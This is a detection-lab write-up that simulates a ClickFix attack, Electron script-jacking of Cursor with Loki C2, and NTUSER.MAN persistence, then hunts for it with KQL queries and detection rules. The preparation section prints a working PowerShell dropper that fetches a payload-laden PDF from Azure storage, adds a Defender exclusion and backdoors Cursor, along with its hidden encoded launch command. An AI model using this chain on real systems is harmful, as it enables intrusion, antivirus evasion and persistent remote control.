> [!WARNING]
> Please see https://detection.wiki/labs/scriptjacking-ntuser-man for the most up to date version of this page.

# How do I use this?
Go to https://dataexplorer.azure.com, then create a free ADX cluster account and a new database. Copy the [init.kql](https://github.com/ksyeung/DetLabs/blob/main/python_pth_persistence/init.kql) data in this folder and paste it into the ADX web UI query window. This will create the required tables, ASIM parsers, helper functions, and start ingestion of the telemetry (WindowsEvent[...].parquet, etc).

---

### ClickFix, Electron Script-jacking, and Mandatory User Profiles
This attack simulation is inspired by this post from Seqrite Lab, [Operation HanHook Phantom: North Korean APT37 targeting South Korea](https://www.seqrite.com/blog/operation-hankook-phantom-north-korean-apt37-targeting-south-korea) and Praetorian's [Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals](https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals). It relies on a simple ClickFix attack to launch a PowerShell script that drops a Loki C2 payload, which is in turn used to establish persistence with a Mandatory User Profile. 

### Synopsis
Here's how it works:
1. The user receives instructions over the phone to visit a pastebin website, copies a base64-encoded command, launches `cmd.exe`, and executes it. 
2. A PDF is fetched from Azure Storage and the file attachment in that PDF is extracted to a Cursor folder in the user's profile. A PDF without the attachment is written to the user's Microsoft Edge browser cache then displayed to the user. It contains an invoice for membership dues to a pension association.
3. The file attachment contains a script-jacking payload created by [Loki C2](https://github.com/boku7/Loki), which hijacks execution by Electron apps. The payload backdoors Cursor, an LLM-assisted IDE.
4. A Defender Antivirus exclusion is created for the user profile `AppData` directory to prevent quarantine of Loki's BOF library `COFFLoader.node`.
5. After a short delay, the Cursor process is forced to end (if it is running) and start.
6. The backdoored Cursor application executes the Loki agent in the background, and the application otherwise behaves normally. The agent checks in with an Azure Storage Account for command and control.
7. The attacker reads the current user's Run key using Loki and TrustedSec's [reg_query](https://github.com/trustedsec/CS-Situational-Awareness-BOF/tree/master/SA/reg_query) BOF, adds a startup entry with Praetorian's [Swarmer](https://github.com/praetorian-inc/swarmer), and writes a Mandatory User Profile file `NTUSER.MAN` into the user's profile folder to ensure persistence. See the Praetorian post at the top, or this post [Registry Writes Without Registry Callbacks](https://deceptiq.com/blog/ntuser-man-registry-persistence).
8. Shortly thereafter, the user signs out and signs back in, triggering replacement of the user's `NTUSER.DAT` registry hive with `NTUSER.MAN` which has the additional startup key. The startup key is named `OneDrive`, and it launches Notepad.

---

### Attack preparation
Pre-requisites:
- Download the Loki client and clone [the repo](https://github.com/boku7/Loki) to get the agent payload creation script.
- Follow the instructions in the Loki README. You'll need an Azure account, Blob Storage, and SAS key. 
- Install `qpdf`. You can get it from most Linux distribution package managers.

<br>

I generate a Loki C2 agent payload, then create a gzip archive with: 
```shell
tar cf - assembly.node config.js main.js renderer.js COFFLoader.node init.js renderer.html scexec.node package.json | gzip -9 > 1`
```

Create a PDF with a file attachment:
```shell
qpdf invoice.pdf --add-attachment 1 -- invoice_embedded.pdf
```

Write a PowerShell script for the ClickFix initial access. You'll need to ensure it is less than 4096 characters after base64 encoding so that it'll execute properly. I relied heavily on PowerShell golf optimizations. You may find [this](https://code.golf/wiki/langs/powershell) helpful. My script looks like the below (note that it is extremely fragile and not intended for reuse):
```powershell
$cmd = @'
$a="$env:TMP"
$b=(iwr "https://adxexport184206.blob.core.windows.net/parquet-export/invoice_1.pdf?sp=r&st=2026-02-20T04:27:13Z&se=2026-02-21T12:42:13Z&spr=https&sv=2024-11-04&sr=b&sig=%2FP1ilodWXHvmKC1BoGupz45v%2B8Bgv7jMcEyJD%2BcjPSs%3D").Content
$s=-join[char[]]($b)
$s-match'dFile /L.+h (\d+)'>$x
$l=+$Matches[1]
$m=$s.IndexOf('dFile /L')
$j=$s.IndexOf('stream',$m)+6
while($b[$j]-lt32){$j++}
$j+=2
[byte[]]((31,139,8)+,0*6+3+$b[$j..($j+$l-7)]+,0*8)|sc "$a\a" -En Byte
&(gcm tar -Al)[-1] -zxf "$a\a" --cd="$a\..\Programs\cursor\resources\app"
del "$a\a"
[Array]::Clear($b,$j-4,$l)
Add-MpPreference -ExclusionPa "C:\Users\localuser\AppData\"
$b|sc($o="$a\..\Microsoft\Edge\User Data\Default\Cache\Cache_Data\invoice_1.pdf")-En Byte;ii $o
sleep 15;taskkill /f /im Cursor.exe;saps "$a\..\Programs\cursor\Cursor.exe" -Wi Mi
'@
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)) 
Write-Host "%COMSPEC% /b /c start /b /min powershell.exe -nop -noni -w h -ec $enc"
```

When the Loki agent goes online, run the `reg_query` BOF to dump the Run key:
```shell
bof C:\Users\localuser\Downloads\reg_query.x64.o go zizzi "" 1 "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" "" 1
```

Write the output from this command into `output.txt`, then use Praetorian's `swarmer` to add a key and generate a Mandatory User Profile:
```shell
swarmer.exe --bof --startup-key "OneDrive (1)" --startup-value "C:\Windows\Notepad.exe" output.txt NTUSER.MAN
```

Send the profile back to the victim using Loki:
```shell
upload C:\Users\localuser\Downloads\NTUSER.MAN C:\Users\localuser\NTUSER.MAN
```

---

### Analysis of the attack
Let's say that the victim realised several days later that they'd been tricked into doing something unsafe and reported it. Zeek DNS and connection logs capture a visit to the pastebin site. They provide the domain and we look for it:

```kql
_ASim_Dns
  | where DnsQuery has "pastequest"
  | project TimeGenerated, SrcIpAddr, DnsQuery, DnsResponseName, EventResult
```

Output:
| TimeGenerated | SrcIpAddr | DnsQuery | DnsResponseName | EventResult |
|---|---|---|---|---|
| 2026-02-20T05:17:37.187579Z | 10.2.10.21 | pastequest.com | {"answers":"","ttls":""} | Success |
| 2026-02-20T05:17:37.187706Z | 10.2.10.21 | pastequest.com | {"answers":"","ttls":""} | Success |
| 2026-02-20T05:17:37.187920Z | 10.2.10.11 | pastequest.com | {"answers":"","ttls":""} | Success |
| 2026-02-20T05:17:37.188024Z | 10.2.10.11 | pastequest.com | {"answers":"","ttls":""} | Success |

Note the domain controller is at `10.2.10.11`, and the victim's workstation is at `10.2.10.21`.

<br>

Let's look at the first phase of this incident with a three-generation process tree.
```kql
let cmd_events =
    DeviceProcessEvents
    | where FileName has 'cmd.exe'
    | project 
        Timestamp, DeviceName, AccountName, FileName, ProcessId, ProcessCommandLine,
        InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId,
        InitiatingProcessParentFileName, InitiatingProcessParentId;
let cmd_pids = 
    cmd_events
    | summarize CmdTimestamp = min(Timestamp) by ProcessId, DeviceName;
let children =
    DeviceProcessEvents
    | join kind=inner cmd_pids on $left.InitiatingProcessId == $right.ProcessId, DeviceName
    | where Timestamp between (CmdTimestamp .. 1h)
    | project 
        Timestamp, DeviceName, AccountName, FileName, ProcessId, ProcessCommandLine,
        InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId,
        InitiatingProcessParentFileName, InitiatingProcessParentId;
let child_pids = 
    children
    | distinct ProcessId, DeviceName;
let grandchildren = 
    DeviceProcessEvents
    | join kind=inner child_pids on $left.InitiatingProcessId == $right.ProcessId, DeviceName
    | project 
        Timestamp, DeviceName, AccountName, FileName, ProcessId, ProcessCommandLine,
        InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId,
        InitiatingProcessParentFileName, InitiatingProcessParentId;
let grandchild_pids = 
    grandchildren
    | distinct ProcessId, DeviceName;
union cmd_events, children, grandchildren
| distinct *
| sort by DeviceName, Timestamp asc
```

Output:

| Timestamp                    | DeviceName                   | AccountName | FileName       | ProcessId | ProcessCommandLine                                                                                                              | InitiatingProcessFileName | InitiatingProcessCommandLine                                                                                               | InitiatingProcessId | InitiatingProcessParentFileName | InitiatingProcessParentId |
| ---------------------------- | ---------------------------- | ----------- | -------------- | --------- | ------------------------------------------------------------------------------------------------------------------------------- | ------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ------------------- | ------------------------------- | ------------------------- |
| 2026-02-20T05:18:10.7594158Z | jd-win11-22h2-1.ludus.domain | localuser   | cmd.exe        | 12256     | "cmd.exe"                                                                                                                       | explorer.exe              | explorer.exe /LOADSAVEDWINDOWS                                                                                             | 1456                | sihost.exe                      | 7436                      |
| 2026-02-20T05:18:10.7615547Z | jd-win11-22h2-1.ludus.domain | localuser   | conhost.exe    | 7648      | conhost.exe 0xffffffff -ForceV1                                                                                                 | cmd.exe                   | "cmd.exe"                                                                                                                  | 12256               | explorer.exe                    | 1456                      |
| 2026-02-20T05:18:18.5045689Z | jd-win11-22h2-1.ludus.domain | localuser   | cmd.exe        | 3800      | cmd.exe /b /c start /b /min powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA      | cmd.exe                   | "cmd.exe"                                                                                                                  | 12256               | explorer.exe                    | 1456                      |
| 2026-02-20T05:18:18.5065647Z | jd-win11-22h2-1.ludus.domain | localuser   | powershell.exe | 12276     | powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA                                  | cmd.exe                   | cmd.exe /b /c start /b /min powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA | 3800                | cmd.exe                         | 12256                     |
| 2026-02-20T05:18:32.7185893Z | jd-win11-22h2-1.ludus.domain | localuser   | tar.exe        | 568       | "tar.exe" -zxf C:\Users\LOCALU~1\AppData\Local\Temp\a --cd=C:\Users\LOCALU~1\AppData\Local\Temp..\Programs\cursor\resources\app | powershell.exe            | powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA                             | 12276               | cmd.exe                         | 3800                      |
| 2026-02-20T05:18:45.5592433Z | jd-win11-22h2-1.ludus.domain | localuser   | msedge.exe     | 11360     | "msedge.exe" --single-argument C:\Users\LOCALU~1\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\invoice_1.pdf  | powershell.exe            | powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA                             | 12276               | cmd.exe                         | 3800                      |
| 2026-02-20T05:19:00.6216402Z | jd-win11-22h2-1.ludus.domain | localuser   | taskkill.exe   | 9804      | "taskkill.exe" /f /im Cursor.exe                                                                                                | powershell.exe            | powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA                             | 12276               | cmd.exe                         | 3800                      |
| 2026-02-20T05:19:01.9261984Z | jd-win11-22h2-1.ludus.domain | localuser   | Cursor.exe     | 1560      | "Cursor.exe"                                                                                                                    | powershell.exe            | powershell.exe -nop -noni -w h -ec JABhAD0AIgAkAGUAbgB2ADoAVABNAFAAIg...AiACAALQBXAGkAIABNAGkA                             | 12276               | cmd.exe                         | 3800                      |

The victim executes code with `cmd.exe /b /c start /b /min powershell.exe -nop -noni -w h -ec JABh..QA=`. In order, these parameters...
- `/b` doesn't do anything.
- `/c` ensures `cmd.exe` executes and then terminates (rather than remaining open).

`start /b /min powershell.exe`:
- `start` is a built-in `cmd.exe` command that is implemented internally: that is, it handles the request directly without spawning another exe. Other built-ins include `cd`, `dir`, etc.
- `/b` starts PowerShell without creating a new window.
- `/min` starts the window minimised, in the strange case where `/b` fails to prevent a window appearing.

`powershell.exe -nop -noni -w h -ec JABh..QA=` then runs:
- `-nop` which resolves to `-NoProfile`. This ensures the user's `$PROFILE$` is skipped, which avoids triggering anything defined in the profile that could interfere with (or expose) script execution.
- `-noni` resolves to `-NonInteractive`, which suppresses interactive prompts. In the case of our script, its not necessary, but attackers commonly use this argument to ensure PowerShell doesn't stall on an unexpected prompt.
- `-w h` resolves to `-WindowStyle Hidden` and ensures the script runs without a visible window.
a hidden window an encoded command (see the script in the above section [Attack Preparation](#attack-preparation)). 

Note that you can see the PowerShell script block text in the logs with this query:
```kql
WindowsEvent
| where Provider == "Microsoft-Windows-PowerShell" and EventID == 4104
| evaluate bag_unpack(EventData)
| project
    TimeGenerated, Computer, MessageNumber, MessageTotal, ScriptBlockText
```

<br>

Next, `iwr` (Invoke-WebRequest) executes entirely within PowerShell as an in-process HTTP request. Its not shown in our query output, as it only reads from `DeviceProcessEvents`. Note that you won't find this event in MDE's `DeviceNetworkEvents`: it filters out connections to Microsoft-owned infrastructure (the URL points to Azure Storage at `*.blob.core.windows.net`). Let's look for it with other means:

```kql
WindowsEvent
| where Provider == "Microsoft-Windows-Sysmon" and EventID == 3
| evaluate bag_unpack(EventData)
| where Image endswith "powershell.exe" and ProcessId == 12276
| project 
	TimeGenerated, Computer, User, ProcessId, Image, DestinationHostname, SourceIp, DestinationIp, DestinationPort
```

Output:
| TimeGenerated            | Computer                     | User                      | ProcessId | Image                                                     | DestinationHostname | SourceIp   | DestinationIp  | DestinationPort |
| ------------------------ | ---------------------------- | ------------------------- | --------- | --------------------------------------------------------- | ------------------- | ---------- | -------------- | --------------- |
| 2026-02-20T05:18:22.478Z | JD-WIN11-22H2-1.ludus.domain | JD-WIN11-22H2-1\localuser | 12276     | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | -                   | 10.2.10.21 | 20.209.117.132 | 443             |

There's no hostname because Sysmon's reverse DNS resolution has been disabled. For this simulation, we're using Olaf Hartong's [Sysmon research config](https://github.com/olafhartong/sysmon-modular/blob/a9ff298f6d228c181be71b213c73d111c6096f41/sysmonconfig-research.xml#L24C1-L24C31) which sets `DnsLookup` to `False`.

Let's have another go, this time with just Zeek logs:

```kql
imDns
| where EventProduct == "Zeek"
| where TimeGenerated between (datetime(2026-02-20T05:18:00Z) .. datetime(2026-02-20T05:19:00Z))
| where DnsQuery has "blob.core.windows.net"
| project TimeGenerated, EventProduct, SrcIpAddr, DnsQuery, DnsResponseName, DnsQueryTypeName, EventResult
```

Output:
| TimeGenerated | EventProduct | SrcIpAddr | DnsQuery | DnsResponseName | DnsQueryTypeName | EventResult |
|---|---|---|---|---|---|---|
| 2026-02-20T05:18:20.910598Z | Zeek | 10.2.10.21 | adxexport184206.blob.core.windows.net | {"answers":"[\"blob.sat46prdstr04c.store.core.windows.net\",\"20.209.117.132\"]","ttls":"[1,1]"} | A | Success |
| 2026-02-20T05:18:20.911051Z | Zeek | 10.2.10.11 | adxexport184206.blob.core.windows.net | {"answers":"[\"blob.sat46prdstr04c.store.core.windows.net\",\"20.209.117.132\"]","ttls":"[60,86400]"} | A | Success |
| 2026-02-20T05:18:20.931825Z | Zeek | 10.2.10.21 | adxexport184206.blob.core.windows.net | {"answers":"","ttls":""} | A | Failure |

This works! Note that `_ASim_Dns` would be effective in this situation, but its unification of log sources would have obscured the fact that Sysmon's reverse DNS was disabled. This was a bit of a detour to show the importance of understanding your environment's telemetry collection. If we didn't have Zeek and relied on MDE for DNS resolution, an analyst would have spent time doing it themselves or maybe even overlooked it.

<br>

There's also a `RegistryEvent` [exclusion for PowerShell](https://github.com/olafhartong/sysmon-modular/blob/a9ff298f6d228c181be71b213c73d111c6096f41/sysmonconfig-research.xml#L56) that creates another blind spot for the `Add-MpPreference -ExclusionPath "C:\Users\localuser\AppData\"` call in the script. Fortunately, MDE captures it:

```kql
DeviceRegistryEvents
| where RegistryKey has @"Microsoft\Windows Defender\Exclusions\Paths"
| where ActionType == "RegistryValueSet"
| project 
	Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
```

| Timestamp                    | DeviceName                   | RegistryKey                                                             | RegistryValueName          | RegistryValueData |
| ---------------------------- | ---------------------------- | ----------------------------------------------------------------------- | -------------------------- | ----------------- |
| 2026-02-20T05:18:33.6178111Z | jd-win11-22h2-1.ludus.domain | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths | C:\Users\localuser\AppData | 0                 |

<br>

Back to the Zeek logs! Let's look for the payload download:
```kql
_ASim_NetworkSession
| where DstIpAddr == "20.209.117.132"
| project
    TimeGenerated, EventProduct, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, NetworkProtocol, NetworkApplicationProtocol, NetworkDirection, EventResult, NetworkDuration, SrcBytes, DstBytes
```

Output:
| TimeGenerated            | EventProduct | SrcIpAddr  | SrcPortNumber | DstIpAddr      | DstPortNumber | NetworkProtocol | NetworkApplicationProtocol | NetworkDirection | EventResult | NetworkDuration | SrcBytes | DstBytes |
| ------------------------ | ------------ | ---------- | ------------- | -------------- | ------------- | --------------- | -------------------------- | ---------------- | ----------- | --------------- | -------- | -------- |
| 2026-02-20T05:18:20.948Z | Zeek         | 10.2.10.21 | 64442         | 20.209.117.132 | 443           | TCP             | ssl                        | Outbound         | Failure     | 42              | 1091     | 524415   |
| 2026-02-20T05:18:22.478Z | Sysmon       | 10.2.10.21 | 64442         | 20.209.117.132 | 443           | TCP             |                            |                  | Success     |                 |          |          |

1 KB sent (the GET request), 512 KB back (the PDF with embedded Loki payload). The Failure `EventResult` is because Zeek probably observed a connection teardown anomaly (an RST or timeout), not a failed download: the data was fully transferred.

<br>

The next eight lines of the script locates the embedded file, reconstructs a valid gzip container that can be read by `tar`. This is almost entirely invisible to Windows event logs and Sysmon logs. While the file was compressed with `gzip -9`, the `qpdf` CLI tool applied PDF `/FlateDecode` (which wraps deflate compression, but with a different container format) and operates on raw deflate. This stripped the gzip wrapper, and what was placed in the PDF's stream bytes is raw deflate data that happens to decompress to a tar archive. The script reads those bytes from the file using byte offset arithmetic and doesn't invoke `/FlateDecode` decompression. `tar -zxvf` requires a valid gzip container, hence the reconstruction. This elaborate process avoids loading external modules and .NET decompression classes.

<br>

Next, we see an event with the native Windows `tar`. The command-line is `"tar.exe" -zxf C:\Users\LOCALU~1\AppData\Local\Temp\a --cd=C:\Users\LOCALU~1\AppData\Local\Temp..\Programs\cursor\resources\app`. These parameters are:
- `-z` decompresses via gzip
- `-x` extracts
- `-f` specifies the path to the archive file
- `--cd` sets the dir for extraction.
This targets Cursor's `resources\app` dir for the scriptjacking technique, where Electron app resources are overwritten for code exec.

To confirm it in the logs:
```kql
_ASim_FileEvent
| where ActingProcessName endswith "tar.exe" and ActingProcessId == 568
| project
    EventStartTime, EventType, User, ActingProcessName, ActingProcessParentFileName, TargetFileName, TargetFilePath
```

Output:
|EventStartTime|EventType|User|ActingProcessName|TargetFileName|TargetFilePath|
|---|---|---|---|---|---|
|2026-02-20T05:18:32.642Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|assembly.node|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\assembly.node|
|2026-02-20T05:18:32.655Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|config.js|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\config.js|
|2026-02-20T05:18:32.670Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|main.js|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\main.js|
|2026-02-20T05:18:32.673Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|renderer.js|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\renderer.js|
|2026-02-20T05:18:32.673Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|COFFLoader.node|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\COFFLoader.node|
|2026-02-20T05:18:32.673Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|init.js|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\init.js|
|2026-02-20T05:18:32.686Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|renderer.html|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\renderer.html|
|2026-02-20T05:18:32.686Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|scexec.node|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\scexec.node|
|2026-02-20T05:18:32.686Z|FileDeleted|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|package.json|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\package.json|
|2026-02-20T05:18:32.686Z|FileCreated|JD-WIN11-22H2-1\localuser|C:\Windows\system32\tar.exe|package.json|C:\Users\LOCALU~1\AppData\Local\Programs\cursor\resources\app\package.json|

The clean PDF was written to the Edge cache. We can locate it by looking for file events from PowerShell:
```kql
_ASim_FileEvent
| where ActingProcessName endswith "powershell.exe" and ActingProcessId == 12276
| project
    EventStartTime, EventType, User, TargetFileName, TargetFilePath
```

Truncated output (there's 13 records total, which is a bit lengthy for an already long post):

| EventStartTime           | EventType   | User                      | TargetFileName | TargetFilePath                                                                                   |
| ------------------------ | ----------- | ------------------------- | -------------- | ------------------------------------------------------------------------------------------------ |
| 2026-02-20T05:18:23.635Z | FileCreated | JD-WIN11-22H2-1\localuser | a              | C:\Users\localuser\AppData\Local\Temp\a                                                          |
| 2026-02-20T05:18:32.704Z | FileDeleted | JD-WIN11-22H2-1\localuser | a              | C:\Users\localuser\AppData\Local\Temp\a                                                          |
| 2026-02-20T05:18:33.611Z | FileCreated | JD-WIN11-22H2-1\localuser | invoice_1.pdf  | C:\Users\localuser\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\invoice_1.pdf |

We see the PDF creation, and also the creation and subsequent deletion of the file attachment extracted from the PDF. The PDF is opened by the program associated with the default handler, which in this case is Edge. See the table from the first query in [this section](#analysis-of-the-attack). That query also shows Cursor's execution.

<br>

After Cursor launches, the Loki agent phones home. But where?

```kql
_ASim_Dns
  | where TimeGenerated > datetime(2026-02-20T05:19:00Z)
  | where DnsQuery has "blob.core.windows.net"
  | project TimeGenerated, SrcIpAddr, DnsQuery, DnsResponseName, EventResult
```

Output truncated for brevity:

| TimeGenerated | SrcIpAddr | DnsQuery | DnsResponseName | EventResult |
|---|---|---|---|---|
| 2026-02-20T05:19:08.277879Z | 10.2.10.21 | 932983489c0923e5.blob.core.windows.net | {"answers":"","ttls":""} | Success |

Note this is a different storage account.

<br>

What about the network session?
```kql
_ASim_NetworkSession
  | where DstIpAddr == "20.60.20.68"
  | project
    TimeGenerated, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, NetworkApplicationProtocol, NetworkDirection, EventResult, NetworkDuration, SrcBytes, DstBytes
```

Output:
| SrcIpAddr | SrcPortNumber | DstIpAddr | DstPortNumber | NetworkApplicationProtocol | NetworkDirection | EventResult | NetworkDuration | SrcBytes | DstBytes |
|---|---|---|---|---|---|---|---|---|---|
| 10.2.10.21 | 52801 | 20.60.20.68 | 443 | ssl | Outbound | Failure | 103 | 77865 | 60220 |

Around 77 KB outbound, 60 KB inbound. This looks like it could be C2 activity.

<br>

Now, what files were created by Cursor?


```kql
_ASim_FileEvent
| where DvcHostname == "jd-win11-22h2-1"
| where ActingProcessName endswith "cursor.exe"
| project
    EventStartTime, EventType, User, ActingProcessName, ActingProcessParentFileName, TargetFileName, TargetFilePath
```

|EventStartTime|EventType|User|ActingProcessName|ActingProcessParentFileName|TargetFileName|TargetFilePath|
|---|---|---|---|---|---|---|
|2026-02-20T05:20:31.120Z|FileCreated|JD-WIN11-22H2-1\localuser|c:\users\localuser\appdata\local\programs\cursor\cursor.exe|powershell.exe|NTUSER.MAN|C:\Users\localuser\NTUSER.MAN\NTUSER.MAN|

<br>

### Detections
Working backwards here, catching creation of `NTUSER.MAN` files is the most reliable. This is also the recommendation in the Praetorian and DeceptIQ posts.

```kql
_ASim_FileEvent
| where TargetFileName =~ "NTUSER.MAN"
| project
    EventStartTime, DvcHostname, User, EventType, ActingProcessName, ActingProcessParentFileName, TargetFileName, TargetFilePath
```

<br>

Electron app resource dir tampering (Loki script-jacking):

```kql
_Im_FileEvent
| where TargetFilePath matches regex @"\\resources\\app\\[^\\]+$"
| where TargetFileName has_any ("main.js", "package.json", "config.js", "renderer.js", "init.js", ".node", "renderer.html")
| project
  EventStartTime, DvcHostname, User, EventType, ActingProcessName, ActingProcessParentFileName, TargetFileName, TargetFilePath
```

I'm not too sure about this detection. The first two are default file names for some Electron apps that I've examined, while the others are used by Loki and subject to trivial evasion via renaming. To mitigate this particular vulnerability, collect a list of Electron apps in your environment and check if they enable ASAR integrity validation, are installed to a user-writable path, and load unsigned JS at runtime. Note that there are also other attacks against Electron apps that are not uniformly mitigated by developers. See the references section for more information. 

<br>

Defender exclusion path additions via registry:

```kql
_ASim_RegistryEvent
| where RegistryKey has @"Windows Defender\Exclusions"
| where EventType == "RegistryValueSet"
| project
    EventStartTime, EventProduct, Dvc,  EventType, RegistryKey, RegistryValueName, RegistryValueData
```

Output:
| EventStartTime | EventProduct | Dvc | EventType | RegistryKey | RegistryValueName | RegistryValueData |
|---|---|---|---|---|---|---|
| 2026-02-20T05:18:33.617Z | Sysmon | JD-WIN11-22H2-1.ludus.domain | RegistryValueSet | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\localuser | | |
| 2026-02-20T05:18:33.617811Z | M365 Defender for Endpoint | jd-win11-22h2-1.ludus.domain | RegistryValueSet | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths | C:\Users\localuser\AppData\ | 0 |

<br>

There are more possible detections I can imagine, which include (but aren't limited to):
- Cloud storage C2 and data exfil. [Mehmet Ergene](https://academy.bluraven.io/blog/querying-azure-resource-graph-without-limits-using-kql) has written an excellent article about detecting when an app connects to a Storage Blob outside of your tenant.
- Native LOLBin extractions like `tar.exe`, `expand.exe`/`extrac32.exe` (`.cab` files), `powershell.exe`'s `Expand-Archive` cmdlet or `System.IO.Compression` .NET classes, and more
- Registry Run key modifications for persistence

I leave these as exercises for the curious reader.

---

### References
[Operation HanKook Phantom: APT37 Spear-Phishing Campaign](https://www.seqrite.com/blog/operation-hankook-phantom-north-korean-apt37-targeting-south-korea)\
[Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals](https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals)\
[Registry Writes Without Registry Callbacks](https://deceptiq.com/blog/ntuser-man-registry-persistence)\
[CS-Situational-Awareness-BOF/SA/reg_query - trustedsec](https://github.com/trustedsec/CS-Situational-Awareness-BOF/tree/master/SA/reg_query)\
[GitHub - stormshield/HiveSwarming: Convert .reg to registry hive and reciprocally, without elevation](https://github.com/stormshield/HiveSwarming)\
[Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more)\
[GitHub - Maldev-Academy/ElectronVulnScanner: Automatically scan the file system to identify Electron applications vulnerable to ASAR tampering](https://github.com/Maldev-Academy/ElectronVulnScanner)\
[CVE-2025-55305: Electron has ASAR Integrity Bypass via resource modification](https://advisories.gitlab.com/pkg/npm/electron/CVE-2025-55305)\
[Querying Azure Resource Graph Without Limits Using KQL](https://academy.bluraven.io/blog/querying-azure-resource-graph-without-limits-using-kql)
